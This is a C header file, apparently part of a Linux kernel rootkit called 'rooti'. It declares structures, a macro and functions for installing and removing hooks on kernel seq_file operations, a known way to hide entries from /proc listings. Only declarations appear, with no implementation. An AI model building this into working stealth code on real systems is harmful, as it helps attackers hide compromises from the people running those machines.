#ifndef _ROOTI_HOOKING_OPS_H
#define _ROOTI_HOOKING_OPS_H

// Shorthand for initializing operation hook objects
#define ROOTI_OPS_HOOK(_symbol, _op, _hook, _orig) \
{ \
    .symbol = (_symbol), \
    .func = (_hook), \
    .orig = (_orig), \
    .op = (_op) \
}

// The different types of seqfile operations 
enum rooti_seq_op {
    ROOTI_SEQ_START,
    ROOTI_SEQ_STOP,
    ROOTI_SEQ_NEXT,
    ROOTI_SEQ_SHOW
};

// Represents a hook to a seqfile operation
struct rooti_seq_ops_hook {
    char *symbol;             // name of the seq_operations object symbol
    void *func;               // pointer to hook function
    void *orig;               // pointer to the original function
    enum rooti_seq_op op;     // the desired operation to hook
};

int rooti_install_seq_ops_hook(struct rooti_seq_ops_hook *hook);
int rooti_install_seq_ops_hooks(struct rooti_seq_ops_hook *hooks, size_t count);
int rooti_uninstall_seq_ops_hook(struct rooti_seq_ops_hook *hook);
int rooti_uninstall_seq_ops_hooks(struct rooti_seq_ops_hook *hooks, size_t count);

#endif